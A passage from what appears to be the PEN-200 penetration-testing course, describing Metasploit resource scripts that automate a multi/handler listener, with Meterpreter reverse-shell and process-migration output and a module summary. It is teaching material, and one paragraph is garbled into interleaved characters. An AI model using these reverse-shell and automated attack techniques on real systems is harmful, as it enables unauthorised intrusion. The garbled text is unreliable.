+<cr>[*] Migrating into 5340</cr>
+<cr>[+] Successfully migrated into process 5340</cr>
+[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02
+09:54:32 -0400
+
+               Listing 761 - Incoming connection and successful migration to a newly spawned Notepad process
+
+Nice! Metasploit automatically migrated to the newly spawned Notepad process.
+
+Instead of creating our own resource scripts, we can also use the already provided resource
+scripts from Metasploit. They can be found in the scripts/resource/ directory in the Metasploit
+directory.
+
+kali@kali:~$ <cu>ls -l /usr/share/metasploit-framework/scripts/resource</cu>
+
+total 148
+
+-rw-r--r-- 1 root root 7270 Jul 14 12:06 auto_brute.rc
+
+-rw-r--r-- 1 root root 2203 Jul 14 12:06 autocrawler.rc
+
+-rw-r--r-- 1 root root 11225 Jul 14 12:06 auto_cred_checker.rc
+
+-rw-r--r-- 1 root root 6565 Jul 14 12:06 autoexploit.rc
+
+-rw-r--r-- 1 root root 3422 Jul 14 12:06 auto_pass_the_hash.rc
+
+-rw-r--r-- 1 root root 876 Jul 14 12:06 auto_win32_multihandler.rc
+
+...
+
+-rw-r--r-- 1 root root 2419 Jul 14 12:06 portscan.rc
+
+-rw-r--r-- 1 root root 1251 Jul 14 12:06 run_all_post.rc
+
+-rw-r--r-- 1 root root 3084 Jul 14 12:06 smb_checks.rc
+
+-rw-r--r-- 1 root root 3837 Jul 14 12:06 smb_validate.rc
+                                                 a1ll2re:s0o6urcwemascpr_Wipahtiusttplorootvweidsetd.brycMetasploit
+-rw-r--r--  1  root  root 2592 Jul 14
+                          Listing 762 - Listing
+
+pLexirsoattmioncginoe7l , 6ue2nnudsmehrosetwraasntidot,nhasan,tdatmhnedoredsiofayrteohner.emsBoteouforfcirtJeeeofuswfcrrerneipyeatetsdtespm.ropvt idteodufsoer  port scanning, brute forcing,
+                                                                                                                                                                them, we should thoroughly
+
+asSWeloshtmoewneditewhoffiesnetuehtsgeveasaelsnuedestscuorfnriopsurtensotspwuettsii,toehwnteushndeaOsecSegf-rtilo5ngos7e.b7sao5la2pl1dtli9aom0tnaossdtiunolretehseobfcyoMsneettettaxinstgpolfgoaliot rbtuoanl nsoiepnttgioomnpstoi.odTnuhslee.ssHuecoohwpetaivsoenRrs,HwcOaeSncTabSne.
+
+Resource scripts can be quite handy to automate parts of a penetration test. We can create a set
+of resource scripts for repetitive tasks and operations. We can prepare those scripts and then
+modify them for each penetration test. For example, we could prepare resource scripts for
+listeners, pivoting, post-exploitation, and much more. Using them on multiple penetration tests
+can save us a lot of time.
+
+Let's summarize what we learned in this section. We began by getting familiar with resource
+scripts. Then, we created our own resource script to automate the setup process of a
+multi/handler listener. Finally, we executed the resource script and a corresponding executable
+file to receive an incoming Meterpreter reverse shell, which migrated itself to a newly spawned
+Notepad process.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                        733
+                                                                                                                              Penetration Testing with Kali Linux
+
+21.5 Wrapping Up
+
+In this Module we covered various features, modules, and capabilities of Metasploit. We started
+by getting familiar with the framework itself and we explored how to use auxiliary and exploit
+modules. Next, we discussed several types of payloads available in Metasploit and msfvenom.
+Then, we covered features and modules for post-exploitation with Meterpreter and how to use
+pivoting in Metasploit. Finally, we created a resource script to automate the set-up process of a
+multi/handler that migrates to a newly spawned process once Metasploit starts a session due to
+an incoming reverse shell.
+
+Exploit frameworks such as Metasploit are invaluable in penetration tests since it quickly
+becomes tedious and error-prone to manually manage various shells and sessions. Furthermore,
+the modules contained in the frameworks can be easily customized to fit our needs without going
+through the process of fixing public exploit code. These frameworks often also provide the ability
+to create executable files, which we can use for client-side attacks or web application attacks. By
+using Metasploit's signature payload Meterpreter, we obtain a broad range of powerful post-
+exploitation and pivoting techniques.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  734
+
